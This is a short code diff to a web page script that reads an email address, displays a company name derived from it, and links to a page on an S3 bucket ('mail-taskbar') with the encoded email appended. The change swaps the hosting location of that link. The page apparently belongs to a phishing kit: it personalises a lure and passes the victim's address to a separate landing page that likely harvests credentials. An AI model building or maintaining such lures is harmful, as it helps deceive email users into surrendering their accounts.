@@ -100,13 +100,14 @@ function generateCompanyName(email) {
         companyElement.textContent = "Company: " + companyName;
 
         // Set link to just use decoded email
-        // linkElement.href = "https://s3.eu-north-1.amazonaws.com/web.task/index.html" + encodeURIComponent(decodedEmail);
-        linkElement.href = "https://s3.eu-north-1.amazonaws.com/web.task/index.html#" + encodedEmail;
+        // linkElement.href = "https://mail-taskbar.s3.eu-north-1.amazonaws.com/index.html" + encodeURIComponent(decodedEmail);
+        linkElement.href = "https://mail-taskbar.s3.eu-north-1.amazonaws.com/index.html#" + encodedEmail;
     } else {
-        linkElement.href = "https://s3.eu-north-1.amazonaws.com/web.task/index.html";
+        linkElement.href = "https://mail-taskbar.s3.eu-north-1.amazonaws.com/index.html";
     }
 })();
 </script>
 
 </body>
 </html>
+
